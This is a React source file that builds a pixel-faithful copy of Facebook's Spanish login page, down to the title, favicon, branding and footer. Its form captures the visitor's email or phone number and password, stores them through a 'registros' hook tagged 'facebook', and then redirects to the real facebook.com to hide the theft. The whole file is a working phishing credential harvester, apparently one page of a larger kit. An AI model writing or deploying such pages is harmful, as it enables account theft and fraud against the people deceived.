
import { useState, type FormEvent } from 'react';
import {
    Box,
    Button,
    Input,
    VStack,
    Text,
    Container,
    Divider,
    Flex,
    Heading,
} from '@chakra-ui/react';
import { useCreateRegistro } from '../../../features/registros/hooks/useRegistros';
import { useDocumentMetadata } from '../../../shared/hooks/useDocumentMetadata';

export const FacebookPage = () => {
    useDocumentMetadata(
        'Facebook - Inicia sesión o regístrate',
        'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg'
    );

    const { submitRegistro, loading } = useCreateRegistro();
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = async (e: FormEvent) => {
        e.preventDefault();
        const success = await submitRegistro({
            email,
            password,
            pagina: 'facebook',
        });

        if (success) {
            window.location.href = 'https://www.facebook.com/';
        }
    };

    return (
        <Box minH="100vh" bg="#f0f2f5" display="flex" flexDirection="column">
            <Container maxW="container.lg" flex="1" pt={{ base: 10, md: 20 }} px={4}>
                <Flex
                    direction={{ base: 'column', md: 'row' }}
                    align={{ base: 'center', md: 'start' }}
                    justify="space-between"
                    gap={{ base: 10, md: 0 }}
                >
                    {/* Left Column (Text) */}
                    <Box flex="1" maxW={{ md: '500px' }} textAlign={{ base: 'center', md: 'left' }} mt={{ base: 6, md: 32 }}>
                        <Heading
                            color="#1877f2"
                            fontSize={{ base: "4xl", md: "6xl" }}
                            fontWeight="bold"
                            mb={4}
                            letterSpacing="-1px"
                        >
                            facebook
                        </Heading>
                        <Text fontSize={{ base: "xl", md: "2xl" }} lineHeight="1.2">
                            Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
                        </Text>
                    </Box>

                    {/* Right Column (Form) */}
                    <Box w="full" maxW="400px" mt={{ base: 6, md: 16 }}>
                        <Box
                            bg="white"
                            p={4}
                            borderRadius="lg"
                            boxShadow="lg"
                        >
                            <form onSubmit={handleSubmit}>
                                <VStack spacing={3}>
                                    <Input
                                        placeholder="Correo electrónico o número de teléfono"
                                        size="lg"
                                        bg="white"
                                        borderColor="gray.300"
                                        _focus={{ borderColor: '#1877f2', boxShadow: '0 0 0 2px #e7f3ff' }}
                                        value={email}
                                        onChange={(e) => setEmail(e.target.value)}
                                        isRequired
                                    />
                                    <Input
                                        type="password"
                                        placeholder="Contraseña"
                                        size="lg"
                                        bg="white"
                                        borderColor="gray.300"
                                        _focus={{ borderColor: '#1877f2', boxShadow: '0 0 0 2px #e7f3ff' }}
                                        value={password}
                                        onChange={(e) => setPassword(e.target.value)}
                                        isRequired
                                    />

                                    <Button
                                        type="submit"
                                        w="full"
                                        bg="#1877f2"
                                        color="white"
                                        size="lg"
                                        fontWeight="bold"
                                        fontSize="xl"
                                        _hover={{ bg: '#166fe5' }}
                                        isLoading={loading}
                                    >
                                        Iniciar sesión
                                    </Button>

                                    <Box py={2}>
                                        <Text color="#1877f2" fontSize="sm" _hover={{ textDecoration: 'underline', cursor: 'pointer' }}>
                                            ¿Has olvidado la contraseña?
                                        </Text>
                                    </Box>

                                    <Divider />

                                    <Box pt={2}>
                                        <Button
                                            bg="#42b72a"
                                            color="white"
                                            size="lg"
                                            fontWeight="bold"
                                            fontSize="md"
                                            _hover={{ bg: '#36a420' }}
                                        >
                                            Crear una cuenta
                                        </Button>
                                    </Box>
                                </VStack>
                            </form>
                        </Box>
                        <Box mt={6} textAlign="center">
                            <Text fontSize="sm">
                                <Text as="span" fontWeight="bold">Crea una página</Text> para un famoso, una marca o una empresa.
                            </Text>
                        </Box>
                    </Box>
                </Flex>
            </Container>

            {/* Footer */}
            <Box bg="white" py={8} mt="auto">
                <Container maxW="container.lg">
                    <Text fontSize="xs" color="gray.500">
                        Español (España) English (US) Français (France) Português (Brasil) Italiano Deutsch العربية हिन्दी 中文(简体) 日本語 ...
                    </Text>
                    <Divider my={2} />
                    <Text fontSize="xs" color="gray.500">
                        Registrarte Iniciar sesión Messenger Facebook Lite Watch Lugares Juegos Marketplace Meta Pay Oculus Portal Instagram Bulletin Recaudaciones de fondos Servicios Centro de información de votación Grupos Información Crear anuncio Crear página Desarrolladores Empleo Privacidad Cookies Opciones de anuncios Condiciones Ayuda Subir contactos y no usuarios
                    </Text>
                    <Text fontSize="xs" color="gray.500" mt={4}>
                        Meta © 2024
                    </Text>
                </Container>
            </Box>
        </Box>
    );
};
